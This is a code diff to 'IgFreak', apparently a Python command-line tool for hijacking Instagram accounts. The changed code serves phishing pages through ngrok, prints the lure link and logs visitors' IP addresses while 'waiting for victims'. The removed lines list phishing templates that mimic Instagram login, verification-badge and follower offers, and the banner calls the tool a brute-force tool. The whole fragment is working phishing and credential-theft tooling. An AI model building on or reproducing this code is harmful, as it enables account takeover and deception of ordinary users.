@@ -255,15 +255,10 @@ def phish(template):
 	print(f"{G} LINK = {Y} {link}")
 	print(f"{G} LINK STATUS CODE = {W}[{G}{requests.get(link).status_code}{W}] ")
 	print()
-	print(f"{B}[{G}>{B}]{W} Wating for victims ...[ {G} Press Ctrl + C to exit {W} ]")
+	print(f"{B}[{G}>{B}]{W} Wating for victims ...")
 	def check_ok():
 		os.system('echo -n "" > ip.txt')
-		try:
-			os.system("tail -f ip.txt	")
-		except KeyboardInterrupt:
-			print(f"\n\n{Y} Exiting ")
-			os.system('pkill ngrok ')
-			exit(0)			
+		os.system("tail -f ip.txt	")			
 	check_ok()
 	exit()
 
@@ -283,7 +278,7 @@ def startServicea(folder,port):
 	return link
 
 def printInfo(str):
-	print(f"{Fore.MAGENTA}IgFreak , Slick Instagram Hacking command line tool. Copyright (C) 2021, T-Dynamos Ansh Dadwal\n .")
+	print(f"{Fore.MAGENTA}IgFreak , Slick Instagram brute force command line tool. Copyright (C) 2021, T-Dynamos Ansh Dadwal\n .")
 	os.system(f"dat=$(date) && echo {G}[{W}✓{G}] {C}Started {str} on {G}$dat")
 def error(str):
 	print()
@@ -334,31 +329,13 @@ def ExecuteIgFreak():
 
     if Parsed.phish == True:
     	if Parsed.template  is not None:
-    		if Parsed.template == "instafollowers" or Parsed.template == "instagram" or Parsed.template == "igbadges":
-    			phish(Parsed.template)
-    		else:
-    			error(f"Template {R+Parsed.template+Y} not found")
-    			print()
-    			print(f"{W} Available Templates")
-    			print(f"""
-{G}Template      Description{W}
-    			
-{B}igbadges       : {W}Hack account by confirming account in get verified badges
-{B}instagram      : {W}Instagram simple login page 
-{B}instafollowers : {W}Get Instagram accounts by seeking followers""")
-    			exit(1)
     		print()
-    		try:
-    			phish(Parsed.template)
-    		except exception:
-    			print(f"\n\n{Y} Exiting ")
-    			pass   			
-    		exit(0)
+    		phish(Parsed.template)
+    		exit()
     	elif Parsed.template is None:
     		print()
     		error("Please Provide a template")
     		exit()
-    	
     else:
     	print()
     	pass
